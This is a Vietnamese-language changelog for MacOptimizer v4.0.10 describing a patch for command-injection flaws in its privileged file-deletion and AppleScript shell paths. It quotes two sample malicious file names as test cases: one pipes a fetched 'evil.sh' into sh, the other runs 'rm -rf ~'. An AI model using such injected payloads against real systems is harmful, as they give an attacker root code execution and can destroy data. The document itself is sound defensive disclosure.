# Nhật ký thay đổi MacOptimizer v4.0.10

Ngày: 2026-09-28

## Tóm tắt

**Bản vá bảo mật** — khắc phục các lỗ hổng chèn lệnh (command injection) trong luồng xóa file chạy quyền quản trị, phát hiện qua đợt rà bảo mật toàn repo.

### Sửa bảo mật

- **Space Lens (nghiêm trọng):** đường dẫn khi xóa bằng quyền quản trị không được escape dấu nháy đơn — một file có tên chứa `'` (ví dụ `'; curl evil.sh | sh; echo '`) có thể chèn lệnh shell chạy với quyền root. Đã escape chuẩn POSIX.
- **Lớp AppleScript (cao):** các lệnh shell được nối thẳng vào `do shell script "..."` mà không thoát dấu `"` và `\` tại `FileRemover`, `JunkCleaner`, `SpaceLensView`, `SystemOptimizer`, `SmartCleanerService` — tên file chứa `"` có thể chèn mã AppleScript chạy với quyền quản trị. Đã thoát đủ 2 lớp ở toàn bộ 7 vị trí (kể cả `pkill` theo bundle id tự khai báo của app bên thứ ba và luồng "đặt lại" thùng rác).
- **Tập trung hóa:** thêm `PrivilegedShell.shellEscape(_:)` (lớp shell POSIX) và `PrivilegedShell.appleScriptEscape(_:)` (lớp AppleScript) làm nơi duy nhất định nghĩa phép escape; mọi call site chuyển qua dùng chung.
- Đã kiểm chứng bằng kịch bản tấn công mẫu: tên file chứa `` `id`$(whoami)'; rm -rf ~ `` được truyền nguyên văn qua `/bin/sh` (không thực thi) và round-trip qua `osascript` giữ đúng chuỗi gốc.

### Điểm bảo mật đã được xác nhận an toàn (không đổi)

- Toàn bộ kết nối mạng dùng HTTPS; không có ngoại lệ ATS; không tự tải và chạy bản cập nhật.
- Không có secret/API key trong source.
- Privacy scanner chỉ đếm số lượng mật khẩu, không đọc nội dung hay gửi dữ liệu đi.
- FileRemover giữ nguyên whitelist đường dẫn + chặn prefix hệ thống + chặn `..`.

### Phiên bản

- `CFBundleShortVersionString` 4.0.10, `CFBundleVersion` 5; sidebar, `build_dual_dmg.sh`, README đồng bộ version.

## Liên kết phiên bản trước

- [CHANGELOG_v4.0.9.md](CHANGELOG_v4.0.9.md)
